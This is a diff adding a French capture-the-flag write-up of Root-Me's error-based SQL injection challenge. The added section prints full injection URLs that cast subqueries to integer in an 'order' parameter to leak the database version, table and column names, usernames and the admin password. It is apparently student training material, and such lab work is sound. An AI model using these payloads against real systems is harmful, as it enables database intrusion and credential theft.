@@ -49,3 +49,43 @@ curl -X GET http://challenge01.root-me.org/web-serveur/ch63/admin
 Pojet validé.
 
 <img src="img/JWT - Jeton révoqué 3.png" alt="capture 8" width="400">
+
+# 7. SQL injection - Error
+Link: https://www.root-me.org/fr/Challenges/Web-Serveur/SQL-injection-Error
+
+Pour réaliser ce projet, j'ai dans un premier temps testé une injection SQL classique dans le champ de recherche.
+or 1= 1 etc.
+Mais cela n'a pas fonctionné.
+Je me suis donc renseigné sur les injections SQL de type Error Based.
+J'ai découvert qu'il était possible de provoquer des erreurs SQL dans l'url.
+
+J'ai donc testé en commençant par cette URL :
+http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC,%20(CAST(version()%20AS%20integer))
+
+<img src="img/SQL injection - Error 1.png" alt="capture 9" width="400">
+Cela m'a permis de récupérer la version du SGBD.
+
+Jai ensuite fait cette URL pour récupérer le nom des tables :
+http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC,%20(CAST((SELECT%20table_name%20FROM%20information_schema.tables%20LIMIT%201%20OFFSET%200)%20AS%20integer))
+
+<img src="img/SQL injection - Error 2.png" alt="capture 10" width="400">
+
+J'ai ensuite récupéré le nom des colonnes de la table m3mbr35t4bl3 en utilisant cette URL :
+
+http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC,%20(CAST((SELECT%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name=$$m3mbr35t4bl3$$%20LIMIT%201%20OFFSET%200)%20AS%20integer))
+
+<img src="img/SQL injection - Error 3.png" alt="capture 11" width="400">
+
+J'ai ensuite récupéré les usernames avec cette URL : 
+http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC,%20(CAST((SELECT%20[us3rn4m3_c0l]%20FROM%20[m3mbr35t4bl3]%20LIMIT%201%20OFFSET%200)%20AS%20integer))
+
+<img src="img/SQL injection - Error 4.png" alt="capture 12" width="400">
+
+Enfin, j'ai récupéré le mot de passe de l'utilisateur admin avec cette URL :
+
+http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC,%20(CAST((SELECT%20p455w0rd_c0l%20FROM%20m3mbr35t4bl3%20WHERE%20us3rn4m3_c0l=$$admin$$%20LIMIT%201%20OFFSET%200)%20AS%20integer))
+
+<img src="img/SQL injection - Error 5.png" alt="capture 13" width="400">
+
+<img src="img/SQL injection - Error 6.png" alt="capture 14" width="400">
+
